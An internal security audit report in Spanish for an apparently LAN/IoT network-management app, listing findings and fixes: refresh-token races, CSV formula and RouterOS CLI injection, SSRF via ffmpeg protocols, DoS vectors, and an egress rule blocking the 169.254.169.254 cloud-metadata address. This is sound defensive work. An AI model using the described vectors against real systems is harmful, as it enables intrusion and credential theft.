5. **`Secure` condicional** (`env.https !== null || env.behindProxy`; dev HTTP → off) y **CSRF** cubierto por
   `SameSite=Strict` (app del mismo origen) + el access viaja por `Authorization: Bearer`, no por cookie,
   así que las mutaciones de la API no son CSRF-ables; solo `refresh`/`logout` usan la cookie y `Strict` las protege.

### 7.5 Veredicto

- **CSP `connect-src 'self'` + `frame-src 'none'`:** cierra la exfiltración off-origin del token.
- **Cookie `httpOnly` + access en memoria:** ✅ hace el refresh **ilegible por JS** → cierra F13.
  Residual honesto: un XSS *en vivo* aún puede usar la sesión en-página mientras dura (no hay forma de
  evitarlo del todo si se ejecuta JS en el origen), pero ya no roba el refresh de larga vida ni logra una
  toma de cuenta **persistente**; el access es de vida corta (≤ 1 h) y no revocable (F9).

---

## 8. Segunda auditoría adversarial (2026-07-04) — post Fase 1/3

Revisión exhaustiva sobre el código **actual** (no el diff), en 6 frentes con verificación
adversarial de cada hallazgo: auth/JWT/2FA, autorización/IDOR, inyección/path-traversal,
DoS/crash/agotamiento, fuga de información/cripto, y validación de entrada/frontend. Enfoque en los
tres riesgos del dueño: **vulnerabilidad explotable, caída del servicio, filtrado de información**.

> **Actualización (2026-07-04):** el hallazgo #13 (heatmap que congela el event loop), inicialmente
> aplazado por requerir refactor, se resolvió en la misma tanda con cómputo cooperativo + caché
> (portable, sin tocar el pipeline de build). Queda como pendiente mayor solo la actualización de
> `@fastify/jwt`/Fastify y el filtrado de egress SSRF.

**Confirmaciones sólidas (sin acción):** la confusión de algoritmo de `fast-jwt` está **neutralizada
por config** (`algorithms:['RS256']` explícito en ambos caminos de verificación + `iss`/`aud`); el
path-traversal de `node-tar` **no aplica** (backup usa formato propio, no tar); cripto en reposo
correcta (AES-256-GCM con IV único por cifrado, backup scrypt con `logN` acotado, manifest dentro del
blob cifrado); redacción de secretos verificada en todos los dominios; frontend sin XSS, access token
solo en memoria, refresh en cookie `httpOnly`, CSP estricta; control de acceso consistente en el
servidor; validadores anti-inyección y helper por ámbito sólidos.

**Remediado (rama `seguridad-hardening` → `main`):**

| # | Sev | Hallazgo | Fix |
|---|-----|----------|-----|
| 1 | 🔴 Alta | Crash del proceso: promesa sin `.catch()` en handler IoT + sin red de seguridad global → un driver IoT caído tumba el agente en bucle | `.catch()` en IoT + `process.on('unhandledRejection')` (sigue vivo) / `uncaughtException` (cierre limpio) |
| 2 | 🟠 Media | `GET /api/reports/audit.csv` accesible a `viewer` (mismo dato que `/api/audit`, admin-only) | `requireRole('admin')` |
| 3 | 🟠 Media | TOCTOU en rotación de refresh: dos refresh concurrentes emiten 2 sesiones sin disparar la detección de reuso (anula) | Revocación atómica (`updateMany` condicional); count≠1 → reuso |
| 4 | 🟠 Media | `issueSessionForUserId` no revalida estado: cuenta deshabilitada durante la ventana del `mfaToken` completa el 2FA | Revalida `status==='disabled'` |
| 5 | 🟠 Media | `scanIntervalSec` sin cota → `PATCH value:0.001` = bucle apretado de `setInterval` (DoS) | `SETTING_BOUNDS` [5,3600] + clamp al escribir y al leer (0=desactivar) |
| 6 | 🟠 Media | Inyección de fórmulas CSV: hostname hostil de la red → fórmula ejecutable al abrir el export | `escapeField` antepone `'` a `=+-@\t\r` |
| 7 | 🟠 Media | `inventory:rescan` sin throttle → amplificación a hardware | Coalescing (`isScanning`) en `scanCycle` |
| 8 | 🟠 Media | Inyección CLI RouterOS: SSID sin escapar en `cliProps` (modo SSH de MikroTik) | Entrecomillado+escape siempre; pattern anti-control en SSID |
| 9 | 🟡 Baja | `rtspUrl` sin esquema → LFI/SSRF vía protocolos de ffmpeg | `pattern:'^rtsps?://'` |
| 10 | 🟡 Baja | Interfaz WAN Cisco interpolada sin validar | `assertCiscoInterface` en el builder. ⚠️ **En 2026-07-30 se retiraron los drivers `cisco-ios`/`cisco-netconf` y el gestor de VLANs Cisco**, así que tanto el vector como su validador dejaron de existir: la mitigación vigente es que **la superficie ya no está** |
| 11 | 🟡 Baja | `backgroundImage` de coverage sin cota; MAC de acceso sin pattern | `maxLength`+`data:image/`; pattern MAC |
| 12 | 🟡 Baja | Cookie sin `Secure` en prod sin TLS/proxy (silencioso) | Aviso al arrancar |
| 13 | 🟠 Media | **Heatmap de cobertura congela el event loop** (síncrono O(celdas·APs·paredes), hasta ~250k celdas): cualquier autenticado bloqueaba el proceso decenas de segundos pidiendo el heatmap de un plano grande | Cómputo **asíncrono cooperativo** (cede el loop cada 32 filas) + **caché content-addressed** con single-flight y límite de concurrencia. Verificado empíricamente: 24 s de bloqueo del loop → 0 (responsivo durante el cálculo) |

**Resuelto después (2026-07-04):**
- **Migración a Fastify 5 + `@fastify/jwt` 10 (`fast-jwt` 6.2.4).** ✅ Elimina de raíz los CVE críticos de
  `fast-jwt` 4.0.5 (bypass por HMAC vacío, confusión de algoritmo RS256↔HS256, cache confusion) y los de
  `fastify`/`fast-uri`. El audit deja de reportar críticos/altos en el stack HTTP de runtime (los restantes
  son tooling de dev: vitest/vite/tar). Verificado con arranque real (auth RS256 + cookie httpOnly + rotación).
- **Filtrado de egress (SSRF).** ✅ `net/egress.ts`: política que **siempre** bloquea metadata de nube
  (169.254.169.254 / IMDS), link-local y la dirección no especificada, pero **permite IPs privadas/loopback
  por defecto** (son destinos LAN legítimos en esta app — no se puede bloquear sin romper la función). El
  borde de configuración (`/api/integrations`) valida los campos `url`/`host`/`ip` con IP literal → un admin
  no puede apuntar una integración a metadata (400 `EGRESS_BLOCKED`). `safeFetch` (valida la URL y cada
  redirect) protege las peticiones salientes (update-check) y es la base para el filtrado por hostname en
  runtime. Modo estricto opt-in `EGRESS_STRICT` (bloquea además loopback+privados) para multi-tenant (Fase 4).

**Con esto, toda la remediación de código de las DOS auditorías queda cerrada.**
El único pendiente es de despliegue: la verificación e2e con hardware/root real, que no es código.

---

> _Este documento es interno a la auditoría de seguridad; describe la postura a junio de 2026
> sobre el código de entonces, más la **segunda auditoría adversarial de
> 2026-07-04** (§8). Cualquier remediación se implementa en su propia historia y se reconcilia con
> la especificación §9 y la documentación interna al cerrarse._
